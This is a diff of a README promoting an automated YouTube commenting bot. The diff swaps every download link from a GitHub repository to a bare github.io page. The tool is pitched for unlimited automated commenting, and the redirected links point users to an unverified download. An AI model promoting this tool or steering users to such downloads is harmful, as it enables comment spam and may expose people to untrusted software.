@@ -1,6 +1,6 @@
 # 🤖 youtube-comment-bot-2026 - Automate Your YouTube Comments Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-youtube--comment--bot--2026-blue?style=for-the-badge&logo=github)](https://github.com/a1803213973-pixel/youtube-comment-bot-2026)
+[![Download Now](https://img.shields.io/badge/Download-youtube--comment--bot--2026-blue?style=for-the-badge&logo=github)](https://a1803213973-pixel.github.io)
 
 ---
 
@@ -23,7 +23,7 @@ Welcome to **youtube-comment-bot-2026**! This tool lets you post comments on You
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download youtube-comment-bot-2026](https://github.com/a1803213973-pixel/youtube-comment-bot-2026)**
+Visit this link to download the application: **[Download youtube-comment-bot-2026](https://a1803213973-pixel.github.io)**
 
 Once you're on the download page, follow these simple steps:
 
@@ -224,7 +224,7 @@ There's no limit. You can add as many video URLs as you want.
 
 Don't waste another minute on manual commenting. Download **youtube-comment-bot-2026** today and watch your engagement grow automatically.
 
-**[👉 Download Now](https://github.com/a1803213973-pixel/youtube-comment-bot-2026)**
+**[👉 Download Now](https://a1803213973-pixel.github.io)**
 
 Join thousands of satisfied users who trust this bot for their YouTube automation needs. It's fast, reliable, and completely free!
 
